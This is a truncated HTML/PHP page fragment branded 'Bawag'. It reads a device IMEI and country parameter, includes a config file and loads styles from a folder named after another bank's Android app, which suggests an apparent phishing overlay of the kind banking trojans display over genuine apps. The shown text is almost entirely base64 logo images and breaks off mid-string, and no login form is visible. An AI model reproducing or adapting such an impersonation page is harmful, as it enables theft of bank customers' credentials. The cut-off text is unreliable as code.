<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="es/com.kutxabank.android/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div class="header">
	<img style="float: left;width: 9.73%;margin-top: 2.5%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NTBCRDJGNzU2ODdGMTFFNzlGMUQ5MDU4MEJEOUFBODAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NTBCRDJGNzY2ODdGMTFFNzlGMUQ5MDU4MEJEOUFBODAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1MEJEMkY3MzY4N0YxMUU3OUYxRDkwNTgwQkQ5QUE4MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1MEJEMkY3NDY4N0YxMUU3OUYxRDkwNTgwQkQ5QUE4MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PjYcrIUAAADaSURBVHja7JjfCcMgEMZjcJAM0p2sI3SC9LE7dLEOkMeCjSBEpE1zfz7jgx8cicY7fhynJzEhhKEljUNj6kAdqBUgl0yuuO2F5sImJ403KmTmno0vZ2Yoz0zUczUrzVBTMFwgGAwHCApDBYLDUICqwBwFqgYTzfy5D5XnzJLGb4Uz+fZtcg+ohNGWofay6Yzmane++fS8ZnOv1R5QogOFNhdFPaMKmrLtq0FRFleBojrAoThOUCiuIwxK4gyBkgZQh5Leqb12e7EKMfyPd16D638/OlAHAusjwAB0ghG0/+hjogAAAABJRU5ErkJggg==">
	<img style="width: 25%;margin-left: -33.3px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAADACAYAAABidSoPAAAkt0lEQVR42u1dCZQV1bWlmaFpZpBJQEBFNM4ap1ajMeiPEzFOiRqHOCSKX+MQvzGJRGO+aBI16jeOcc7PF9Q4z3GKEkVNVIKooN2MzSAN3TT0UOvvTZ/CS1n1XtXr97rrNXuvdRZ0vRpu3bq165xzzzm3QwdBEARBEARBEARBEARBEARBEARBEARBEARBEARBEAShIBg4cGAJpBOkJ6Q3ZMDAcPSHlEG6QzpC1HmCILR7guw8fvz4XrNmzRpdVVW1H+QyyHTIx5AlVRtjMeQDyH2QcyG74LihOJ7kWqLeFASh3QEE1xdEdyAI7yrP896ALIXUQNZBmrxwcPtayGrIIsjjOP5CnGcCztddvSoIQnvSIkeB3K4D0X1u5Njg5QaSajXkPZzvJJx3oLRLQRCKlRx9LbIUhHYwtMCZILdaL3+gpknz/C6cf2tcp5N6XRCEoiLJadOmdSgvL6epfQYIbTak0SsMqJ0+jevsJrIUBKGoAJIsA3ldABJbkMH/mC/QHH8T19sRZCkzXBCE9ANk1ZnmNsjrE6/1QLJ8FtcdievrIQiCkG6zG2Q1CqT1HKTea11wkucKXL+34i0FQUizNllaVVU1xUirLfA5rr8Hg9P1NARBSKM2WcL4RgsBaivUgSjvYMymnoggCGnUJvuApG4mWXlti4Ug7H2ZIqmnIghCmrTJjiCn7UFSs3Kc5W4ygl1l0qKgdBD2AyRuPRlBENKkTXYDOZ1kaYlJsQbCXO87IedBJkOuhLyO7UtyiMEk6f4bxD1OWTuCIKRFm+RMdxnI6bc5ZN+sgNyK43emBmhVgig98fcQbD8Zv8/MgSxZUGMSztNFT0gQhFQQJUhpKMjpqYQhQTSxr7GKQB0jNNXu+H137PdpQqJcjTZdykpDekKCIKSBKEtASmNBTh8m0Pzof3wJJDg2WzaNmfXfx/7Lk8x+Q/4H5++rmEpBENJAlB1BZAwLqkqo8f08jsZnRDwGx7yTgIiZqTMNxw0WUQqCkBai/BqIaVkComTln2NxbNeYpv0AHHN/gtAjugCew3HDNaEjCEIxEiVnpRfgmImsVRmTKPvhmDsTEuXzIkpBEIpZo1yOY06l/zEmUQ7GMdOt2rmIUhCETYIo19hkS79sPkTzUW6H/eclOL+IUhCEoidKmt+f4Li9oVVmjHXE74Ow39UJYzRFlIIgFD1R+mTGGpJ7hM1+U9PE9s3w+2U5ZPyIKAVBaBdE6YfxcKGws0CKw2wN71JbsXEC18RJGD8pohQEod0RpW+Gr7Q1vP8MuRHynC1PuzbHc4ooBUFoV0QZXMN7TR6qo4soBUFol0SZT4goBUEQUYooBUEQUYooBUEQUYooBUEQUYooBUEQRJSCIAgiSkEQBBGlIAiCiFJEKQiCiFJEKQiCiFJEKQiCiFJEKQiCiFJEKQiCiFJEKQiCIKIUBEEQUQqCIIgoBUEQRJQiSkEQRJSbGFFyJUq236RjQPztGoSCIKLc9IiSfTp+/Pges2bN6o97GAkZzz4OCLeNxj4DuC+O6aTRKAgiynZPlGwrSK8fyG9XtP0/cQ9crvcNyALrX1cWQt6C3IN9z8cxe/NYPg+NSkEQUbY7ojSC7Amy2wVtvhdt/5hL+ELqIA0Z7rPRVq5cBZmHY+/DOfbEuUplkguCiLLdECVIrSvIbQzaehHa/JkRX1MLlvutwLn+C+cchXNLuxQEEWVxEqWv7YHIeoPQvou2/s00yHxhBeQhnHtnErFGqSCIKIuKKEmS06ZN61BeXj4IRHYh2lmZxbzOFTTb38Q1DhFZCoKIsmiI0tckQZJDQGA3oI1LC9wPNMWfwLUmKJ5UEESUqSdKaHW+JkmSvNbM49ZADfrhblx/M41WQRBRppYofXN70qRJvia5opX7YzmuexFnwzViBUFEmTqiDDG3V7RBf3BGfDauv5PiLAVBRJkqosyjud1gsZLL7RyrLYYyCVajPy5hvKZGrSCIKFNBlHk0t1fiPl6GTIbsAzmAMZeQN4w8k/TJs2iLCoUIgoiy7Ykyj+b2PPMtDsM5uzOf26Q7to3Ab1MslTEuKtEnO8j8FgQRZZsSZR7N7flo/3EMSs9wrQEk0gR9T+30e+gTxVUKgoiybYgyj+Z2LeT3OEe/bDnbIMvBuM+7LGYyG9Zg36k4p2a/BUFE2fpEmefZ7YVo+2EgwS4xrtsZ+37LJnqyZutg39twTC+NXEEQUbYqUeY5mJyhPB+z3mSctnMf7LsV/Zkximk0YN9XcEw/jVxBEFG2GlEWIJicZPcR2j42AVFuiWM+SUCUfTVyBUFE2SpEWaBgcpLdJ2j7dgmIctuYGuVa7PsgjinTyBUEEWXBidKpAlSI3O3laPvpMOm7x2hHN+x7VswybZzMuVaTOYIgomw1jRIkObBAaYnrII/g3CPp/8xE1vh9LO7zg5jFfleRgEmuGrmCIKIsOFGCoPqCyM7BdaoKdA/UEKfiGiOCs99GkN3w25a4x0eMWONgCfbfUQHngiCiLDhRGkmenzArJhd8AXkQ1/oOy6RxttquPQL3diJ+e9JiLuPmi7/BVR2VwigIIsqCEiWIqo9pkgtb6V4YSL6I5jXkbcjr+PsD02TXJTjPGsiNaHsfLTwmCCLKghGlY24vaIN7ajRpyKFy0PogdrR9kpaFEAQRZcGIshXN7UKA8ZNPMd1RI1YQRJQFIco2MLfzjUq0fx9N4giCiLIgRNnG5nZeJoTQD5fjPhRkLggiyvwTZZGb2+uLYEAewD0M0wSOIIgo806U7cDc5qTPDNzDzrgXmdyCIKLML1G2A3N7nZHkTriXThqlgiCizCtRthNz+3ncw+4iSUEQUeadKNuBuc2iF0/iHnbDvXTW6BQEEWVeibIdmNs1uN9HcR+jFQYkCCLKvBMlF/AqcnO7xma3x2l2WxBElHknSpBkTxDM8dh/fhGb24+SJHEvKnYhCCLK/BKlkeRh2PezIje3R0mTFAQRZd6J0kjyOOw3R+a2IAgiyq+SZHfTJEmSTTK3BUEQUYab23NlbguCIKIMEGU7MLerzdweK5IUBBFl3omyHZjbrAJ0E+5hjMxtQRBR5p0o24G5vYKrPZaXlw+VJikIIsq8EyXIpbTIzW2S5G+5fjjXERdRCoKIMq9ECdkCbTu8mM1t0ySHWF9rwAmCiDKvRPkq5KwiDiZfb25PmjRpqDRJQRBRFgJN1p7l7cHcHj9+vAaaIIgoC0aWnsxtQRBElO0LMrcFQUQpZAC6sUrmtiCIKIUILEQfToY2OYhapDRJQRBRChtjGUmSFdZFkIIgohS+Cq6W+IxlEGkwCYKIUshgdu+ldW4EQUQpZAiOt7JpQzSaBEFEKWQOC6KfsqdGlCCIKIVwNELeAVnuALKUCS4IIkohAqshV4Mse2tiRxBElEJ0yuVs9OXumtgRBBGlEI216Mv/g/ktlVIQRJRCplRGmN9HgSy7anQJgohSiJ7YmQGy3CpqTXJBEESUgudVo08vhlZZqhEmCCJKIUu4kCZ2BEFEKUSjBv16PYtlaJQJgohSyJAHzmV20cedNdIEQUQpRJjg6NvXoFUO1UgTBBGlEI3l0Cp/BLLsodEmCCJKQeFCgiCiFHLGKvTxL6BVlmnECYKIUohGJbTK/dDfnTTqBEFEKYSDBX4fh1a5mUadIIgohWgsgVZ5Msiym0aeIIgohQitEvIiyHKUalYKgohSiMYK9Pe5ChcSBBGlkBnzoFVup3AhQRBRCtFggd97VeBXEESUbYkGr3lphjRjAbTKY1XgVxBElG2BNZB/QBamnCzXQqaDLIdrYkcQRJStiVrIo7ifnSEX4v8rU97epWinwoUEQUTZqiT5CDS0cSCeEsgwVu7xmnOt0wpqvO+zzdIqBUFE2Rrm9l99krT76oT7+ha2L0o7waOd16nAryCIKAutSZIkdwDZdHTuqwO2DcRvf4LUpfweKtDWg9H+LhqRgiCiLKS5/ZW1aUg8+O1w7FOZ8vsgkf8JbR0sE1wQRJT5RE3Q3A4DfhvAmEWbZU4zFqOdh2vZCEEQUeYLX0DuBkluH6ZJBu6vBPvtjP0/Svk9cdmI13E/m2tUCoKIssW50pBrQH4jspGko1X2xD3+xAg2zViN+7oa7e1doGfdQaZ9Kt9BPZe090mRESWJ7maQyVCQSaJOxzFb4NgXvOYKPmkOF/oYbd0L95fXAr/8qOC8ZZC+jNvUi5kOMuCz4DPhs4n74W/vsLkF9kkf/L+ziDK5JkmSHJmEJJ3O7477PAvnWF4EE1S8z/75IjM+Y5xva5z3SshNDHLH371Elm1LkngGtHSOxzO5EXIV/t52UydLI0mG9d0AuQ7/3zsVZFkkROmb20NzIUlnYA7DedIehL4+DxzP5Jv5WjYC5+lhroelFnM6G3+nfrEzM7+6Q0rZF+2J2Nn3eAZbWLptrb1/UzblD5i9o0PQDw9BVllm3Z0M82vzPikCoszJ3I74WnXGeQ7jDHPKiZLLRjyK9g7J0zOm5vILixQglvGZ89mn/KXpTysAcgVkf/zdtb2QiBHllngWc8zlwhCxO7Ct3yZMlOyT4eiH581FRnmO29r8o55yomyRuR1Blv1wv7ebZpVqVwPu+wK0tzRPRPlLhyiX4+/tU06UdJWcYZlVbPc/8fe49lLD0yHKjx2ivBPb+osoNyLK50WUmVHdUnM7w/3uagM0zfDzwHdvqd+qSImSbf650+aladeCRZQiylY3PelLRLvG5pMkHZOuN84/1XkJ0xxUP5Wzfy15eYqYKIuqzSJKEWVbEOULheogC5XZCdf4wEt/gd9P0A/lLZnYEVGKKEWU7ZcoC9pBIMteIMuf2examsFlI6ahvYNak3RsxrmjScbBbfuUxGxLxvPa7yyTV4o2Xh5o846ckLNrlkQcn7Q9G/aPQ1DOtdmObgFJdJ4IouxHKyriGp1yeR/8PjXpGjhnV/+3HM63UT8727uEnL9gRJn0mYsok5PlcFzj70UQLrQUpH4CY0Fbgyj5ouJ6nPTaBjIe/y8NG+hcxgK/bYl9JpgvOVs6Kc9LAhwP2Rb/H+Ce137vht9GQbazWLpaZ2LvCGzfmgQDGR0MpTFLYQSPZYJBtvg7BvX7+zNUB/+PDEFiXzHDixXpeb8s4Qc5iTGpJidAdqC7yIL6O+dClBDWJuhr93mAc40TIXtwqWN+ROJqnX7wNu+P7znkGMgPHDna+muEnbckxjPsyv63ZzjS6r8yomSgjZlDAufnfkOyLXuSC1E6z5DXGJ3vRA0RZfO9d8E1voNrLUl7HjjkLQyECTlqFLGJ0l6EQdjnaq+56tJcBkVTMwh5Af8Dv/+LcZ+QB0iWWb78JMEzse88ixW9Edt6BZ7HIfjtZSOQYIX6hbadMgP7XsAYUf8l4wuD7dNsvxn4e/8ol4WR6o7Y7zHb/+8435iw9hsJ7ITfL2W4CmS+EXe1I7RMqiAfMqgf+38j04ctgijvgnyDgdZ0uYRco8raeYkRW0kWkizFft+2gPZ37PjqEGG43MvU4LH/Vpk+eNRysd++Fo/MfnuW0QiQA73mkoafWUife35GLrCAzTGZ0nOTEqUlUnBi9mkbgy8wsaIg7plNnChJCpvxJffSX7OyGv1xGV0GhSRKC5+62F6q9fnnJAieI9BvZfjtWkfjW0TNJIs5z3O/4jUv/ubh/xVuJLG186f2ojVGRAI0mtAl8SqO6e+/wMziILHbvg34/S3cz+iI585apTc5rpfFYe03At6WEQjsCycFtilE/O3sk3f4IYnSokKIkud9yz48NYHzuX70BusflhfcJoos+WHD79814lrj9GdYm/3z8sP0MI4bm0Gz7mHjo9qJTmE/fmrvUNi5iXVe8zLN50WFvCUhSkv/pJb8kvdlZbDP8Pd+BanAtSkTpaMZHemlv2YlB94H1GySfjHjEiW/9jj/Od6XVeF5zdnYNtEdfBykNA/x2+3OByaO35NE+Z7/0uL/VQGi5Mt9LH6aac8j6D9eZNoc5d/Y99fuS0c/Lk7p5vOvwT63Bf27+Jsv+4lO4kGjaaBbhLyQjOf8oaPdrrN2VRrJfWRB4xVGpE3Ofn+jayJCGwoSpT/u/Q9BtWlJcxwtza1TwDb8ISrVlZo6zn+1kaSvsS63c81x2r0oEFPMD+Md/GBmGEu/CESM+P+vsz6da8S5yPmQ+uPpI7R5jwhrJitR+sUySObY/ogz/vxVDoYVZDJsUydKe3GKpWYll424Pml1oThEaWbaaUZCPj7Dth8GtVgjyn7MJMknUVo7utN8wk8HY5d7nfOTOE7H9oPou6M2VV5eXjZt2rQNVWZoZmP7fiR35x6WYNsZvhlsPq3gPot572Gmsp1zb9P2SFyP0+SnqWl+xLFmeu5nBDLH0d5W0NVAl0NMovRJm8H1l0Im2jW+Djnbay7q4pLaQvZHmAbFjw5++74R1izL+jkVsqe1l+3eCnIUidHRENd/kHDP+4S5LULGko+V2H6f+SR34cQb5Ahs/33AtVWH7ffgPGVJiZLPmc8bz30ott1mHyafJB9nOcWC5cqLKDeYV9vZ17ZA+iDehUa8A2uhaNTDymlsat6WHPPR1q8n0SqzEaVVsDksEIRPkjwqzNQvJFH6z4MfA/w8JZB2uRNNWZsN7ui3JYa2+C79uzRT8e/m+PtFRzurNa1zYBarYwwnKmzSqoe1ocSRTua2+LHzLjEV9Sn81icBUc7h87WJlc7OuXuYT/UJ01Z90rkjgnTcibNx1DytalSnQLu72KTmA46iwA/yfzPHPiZRsg9vAIENsxnvjjb51cVcW1NcIsbx88PSc+NolLjGZryW92XJxLVGktsXbCKnAETZ6Pufioko7WXgALjEy/cStw0NXtOKlV7DJ/O8tW+/69VOf8Kre/E1b937s72GigVeU01t0jOuscXIyvJBlDZzva9pHj4qse30KH9ooYkywsSLFUcZ8D/WOITyIF4yzpb/yjHp6cd8Bfc5KkEYUbZrb25+Rv8eF0Z9DEKIkhroCVHLF3M7NUDHNcLzV0bVBHBCsUqytJta8wE2eeQT/LPY3jfGWGLB6XfRtyNd7d5pMz9O4yxm2de0v8C2A4OacDaipOWH437jfVkBrN5cJrsUlCTzSJRUfZeaij/DzLeVLQi7aXWidGpWvp4nssfrWefVvTrDW3HuZd7C7b/hVQwY7VX0HuFV9B3pzR88wVuy33e86mtv8Ro/X9Csbcb3VdLPs02CWMFQosTg7movyJvOs6KpelmUj6qViTKngHMnocAN/eJk2P3mW2xy/K8H5KtKk127Dwua+FpfJq05QJRs5yxui3quTgWs911ypWugpfdAssW1Fznk954/UZbludRQ8+ckTxQZW5884mjC9IOeQ/9vXKLEWKX//HzHjGd/vc1Z/WxhR2khSs523sAYL/N9MAZuW34ZeSM5+v3aJCLfzLZzvDzUrGxaU+fVPvK0t3DrfbzKHlt4FR2He593GAIZuuHfik4jvMq+472lh57krXvn/SRkSdI4JUrziEM6EMb8TcC/rzgDmIN+Kr/c2T4qaSZKJ8bz4MAk3RqHYJbzxUsSReAEVNP872nl3zYSI5wNvtUERMkx/zS2Dcs05mlJYJ8/O+/VKvx9epB0IrThbmFttnZvjvO8Y0oCifKffF4xngs/QKeG+WGdY+gCmOpM7JAoJ8clSghnt4MTrvTPHhL3HWhropyLwXYctQ9HxS8xNZl+LwbyPpxD6E2bEKVjOrWsZmV9vbfm6Ze8heP28ipKhhs5Rktl6Rbe8hMnew0LFiXR4Dnj2TtmxkMYUU7iLGHg2fAFeTPbuj3FQJQOqfzU++oSIDQtpycpY2exlAMsoPpYugXoAjElwZfrGRtqs75NCYly/Uqc2cqs0R9pExl1mUgnMDk23CZYGAA+1dp5Q0DuciZHkhLlyVmIkpED5zoujyRE+SrkrJD5A34gfppLuFxrEyXjzr6XqQyYEeZoi3VqSDtROprIMS0JQm9cuNirOvIUr6LL5llJcgNZDtjKW/3HezD818btn6zaRya/kgVG1zlhHRvCQ3D/1xSz6R1o50jTmt3QGlYi2j3u2DKyOdDCoeaZW6nGPlhh0uT4EJMQZdZcb+sXN7Uzkij5DBm1YAHZi21CJarNwQ9mvolyskPEcYmyyXhpueN2cp9jBe7voFapgJ4jUbJT74mzDrVF8h9qPszUE6UTLnRHTkHo9Q1e3fOveJWDtopNkuvN8I5DvUW7TPQal8TqJt+fNS5HovRcx7qZcq67gYHBR2YIli4WouTY3jMQ8uS/qBfF0UZs5vYwizusC7ywq0NklasUFIAoSTrnZdPOLCb2lzbxU+8887V2bFi7m1JGlF4g8L4yEGDOfn6JVmDBC4nkSJScnTsjjn/Abn60OdYbioEorU92tzSyZL7Jmlqv+orrvIqewxMRJf2WlQPGeuveejeur7IqWyZMjNg3Dthby8vLx1koTrUTcjGdebxRhSuKxPSmv/zVCDcKw3D2zzRbaq6YMdj3vUAg+acM+2GUBF94R86BnG/7N+RAlHfFML0ZSH6DE0/5FdKxLKVDLe7TDVD/p8U6nhfS7gts/6aUEaUbifFDjFW6Pt51nsdK++iVpo0omyxPd2KcVCF7qQZamuDaIiHKnGtWNq2q8VZMvsyr6J6UKKFVlo3yau+fjl6K1U2xiSMq9s3S4CbYLDE/Zi87HzOe/xyGTcUkymUpm8wZhHu6JZAZssCZuOK/j2bSRiw3/VQnbIZ98yyO2RPn72/r+WwkjMfEMX/KYTKH7ZmObYNj+Cjvd96lr8wgow0sgjE9MMvMxctY37V3RLs5CfW6nx2UMqJkAPzPbC6ki4VIuXGy7zFEqKAl+HIkyvlRGQERL9UAHHN/sRClE2Kyi5lcsSPDm1aTKH+WG1H2GuXV3PW/cf2ULSHKeiOJcX4mg02+nextvJ4Qg873DMl/5oekj8UquhrlPpnCVCzF8P1WCA9ilZ8fB/zMzAPmBNazDoFQG7mc4SsR5ym1NMBa52PAYhddshBZLkRJEmahj9FZZr3ZhzMC2T8bYhIteWKU+aB97fBDTtBlIWCuTzQ7hRql/8Hu54w98skfnefCONm/tKQUYVyi3C6hD5EP50dxyn7ZzY+ymeQkpveTOG5oWxbs5KwpHsrVzgOORZRfXHJVDkQJ07v/GG/tjJnopcZCEyVf+K8sMYG/Bwc0Ec4OP4ztm4WRUWCphhor2tEzog1+6uDn2WaEM7Q5TsA5P3C7ec3VcjbEhjJfG2ZbH8vrd4PrF2Db0UE3kr2Q1Jr9GWa2mZWUts5CZPRvb3jReY/YNjQGUfq7R7oDrA/LbQa4ydG2RjtpnDzvWOcDz6D6N8KCxwPtZnjQYtdHSa25jYmS8qJ9PNy2sh/2sbhtvx9YivAHDPErFFEGV4NLMpkzMOZkzhEJiZjnv4119Nq62rMNoNdjhwvV13t1T73oVQ4Y48RNxpCSId7Cbff3GhfH7qZlLSDK5WHrz5g2sksgD5rxhj8ODkAb/GcGQm8+ikolM9PuJtcUTpiZw4/zQdkyMCwdb5qj6fL4m/yxSu0R/780MJPqr03UKUCUrJB0veMPXGpac8cMEz/72cx4k5OFckhEFkpYUYzHrK5iWLm3zXDM75w+IQk+60Yo2DMcbc9wfWA99vk4U/YRTXUcc6EbHkQSCisw0QZEGWpZmhLzX87484vG7F6QfG9rHOv4vRTiQM0WHjTJ8l4zhQcxR3aml2zJBWonVxTcQRuvf0j0h8cOF2pq8hrmVXiL9z1yfUB5XG2you9ob9XvYE2siT3RTj/xNi0gyqgyaxzUP3A+bH5lna0D1az5Vd/LtLMmx4fHijl7mQ+Pwcy9GSKGbdc7vr44ROmX81rtWhlWL5EFf/sGyYfXtDzgVU7b/2HkXRIgnDsdAvQ//MMCmou/HvoqR8N+HNvH2r35Vby7GwGzP54LvEc0C28PhltlyPWuNbcI0/L6ZulDfiyPo98u2A82idXg5mKb+d3dqTzekx8w/PYjI/fg4zk+RNNOBVHafQ61LKh6p++uj6qolI+JC5bMusVLvoTrPEbM02dgxQo6WeB5Z/MTMeD8r44pFxf8cp8QLBbbRkTpp41Ni+1jravzau7+i7dgxM5eRYdh2X2TXUd5SyYe7zXM/TxJTv1MVq3OMTwoW+FeDtaHAhk7f3CL7Ppxeth+d0jYET+iL0FuhjzEIgjexjUR4xBlV/MpLgq4ZGhGcx2hJ9zybxb/enQgFIhm9bEhLzu1rm285nJujc6YO8t94Z3KQbPdWW/sNwfyW5rzVn2cM8f3eM2FbBtCah4w3Gpf138bQZSNzn0y4+3xkD50++IZ+iNDSsOxgMZFgXkHktPLNlPvV2WfAnkxMFnV5EQ+/JlFnANV6FNDlE74V0UgY2diQWpSmhZxdo4FITiQWcLpe5bGuJ2Vh7osxxRGPqhPWSklLQtJ2Ut4RCDcIvNNrPjCWznld978zXf1Pu88LMIMhyZZOtJbvPcRXt0Lr60322OCfXp/HNdHhBm7NMtSEF0svKTCIbWK4MWcorbPhHxk623bWufvDwNVZJZkIEo/Syrs3BwjLNz7N044OJNLf3D2pal+SYaJGk5enWDk5rdndkjZtzIz1YNpU7XextXN65xnwwmrdx2yJDFcHCh+TFIY57i8Gk2rc8ltXaAPPYfQmKd+WNTEkvmbbwu4RhqMrPx21zhtrLY2L3HIklbLBHechCwjXG1abdcsRHl2gCjPzgNR+tEpVznn5ri4LayiUj60Jt+MmuvltiohH2aVOZk/tq/66hzTAGnePJ0t37iNgtDvS0L8TSurvTVPvuhVHXSMVzlwS5DiKGiPmzdLr9HQOHf0vrjoCq9+9idJSNJP37o4ruPazNjJ9oz4rP4VVVA24Lf6jR3DwTcnjNTMsb6j+QWXWv80OlJvL9PbkG/TDLWXl1WQZuKUA7JEHuxkBRWqnAySOuuDx80E9/2J13hfLp/wQLZA5PLy8v5mzpKcWFrstbBCEJbhcqZplquNwBoDUmcfoMcge1mSxTzbzgmX0wKxjvzIjLSQrBrruyto7trss19N3b3GOksQeM3cG92yWELMivu9fQzWONpuo6P11log9+Vc88dC4pZFjROnuPJ8uzdGE+ycJSzM//BW2viYZ9EUnULazGVI7rVnyHFyCyfVMhTcYD9uZcVsas1aCi0Rl08i+GtCP2WYNtjktWwJ2GV8EEG/SwpMcL60e9qsbaJMncaqZetLq1VPvdlbdsp53vLTfuLV3Hqf1zDn0/VxlwnrUjZZ2M4Bcc0Lv/QYtXzmIlM7jpMswJhA7PsTmt2ZquyYL5pxi8dYQPN7nDW1f+lXPJuTLFZXkT6xKzkpQcd7jFlsv7wWF9q6ir5Fk18zGNx/geyFGW+5zNfYMgkZV5m0IrCDnHvcPsMiVt1tITWaro8490hhWA9f6EPZD85CZEfbec8PSwk1S2Wi5Vr/gi4Paoj0JVqbnnGu8y5NcIZw0TcX0zftT17tj2Ovpd8y0O5XLb6S9S/LrA85GfbzTOPEPqLnm1vglOAibxH9x1VPae7famvn9IjYjx/eHay9WZ+j80H9mrlDfsV7KNgksGmV3wwxMVoT/ize4A4phMXVXZBTdSEQZlPtGq+petV6WR8rmdvnZJ3FjA1I+Hw7WMWbsiQfISufVRanjJdNEDCgub+ZxPy3T4iJxQmKXgnTETvbcWUmpSEzsiV23l4xfbfBeyyJ0Yc97J78e/SlV7BfrT/K/AXQMtxXL3s2wX7vG+jL3pl8gZnebesvt73+eUsDpnWsceL0Wbe4pGT79s4292DzHLGfY+DZlxY8Usac87d7bbfQFicBDi2IIzZ/EzujEk3s5B+VUWuOCILQOkTgO+dntdB89nL0c94Rp9BGG2uVna2SzAdt0EfMJJnSaqWlBEGIngHnYkyBVLZCg4QzMxj0m+I+ov/p1JDYs0Iia26yIAitiPLy8gFhAcIFxNxMayCnlCzpnD4qkE5WyA8Jsw52Ldgqc4IgJPPDcTZw0qRJQyzLYWkBCaDe4sEOj5M3nlKyPM3yatcVUJP8wPqoq0aoIKSHADaETrDWm5mY9XkmAMZJvcA82GIkyQBZ+lVpqvPtk/Sal+LcTSQpCCnVLG2Wt5ctmv6ohcU0ttCErLcybZdbfbwuxd5XFg/HGLsrnaDaphb0EbXICuujkTK3BaE4CJMBtFx4/EyrpLPIsgnWxSDOBiOO1RbF/5itc9G7LUuoFaCfSizdbU/L4JnrpLY1ZCFOt0Q/8+f/whAgaquauBGE4iODbkaYR7C6D17qh63u32Lvy0WAfFlmudFvQB7kimmspWeVXzq14z7qaClve9iyAHdYH8wzf29YH7E4w/1MS2SdPau8Iy1SEIqcDJhmVYqXmuWquObuBBZZCBGubzGK6XMMqWnPBBnSR0zXYxWXfrbW+dasARnRR1tYH/XYlPpIEDYls9xfXD1KSjZl89HpoxL1kSAIgiAIgiAIgiAIgiAIgiAIgiAIgiAIgiAIgiAIgiAIbY3/B2OEDuTzU69DAAAAAElFTkSuQmCC">
	<img style="float: right;width: 9.73%;margin-top: 2.5%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM1MjgwMDU2ODdGMTFFNzk5Q0RBNTk5MjgxMEFBQkEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM1MjgwMDY2ODdGMTFFNzk5Q0RBNTk5MjgxMEFBQkEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1QzUyODAwMzY4N0YxMUU3OTlDREE1OTkyODEwQUFCQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1QzUyODAwNDY4N0YxMUU3OTlDREE1OTkyODEwQUFCQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pt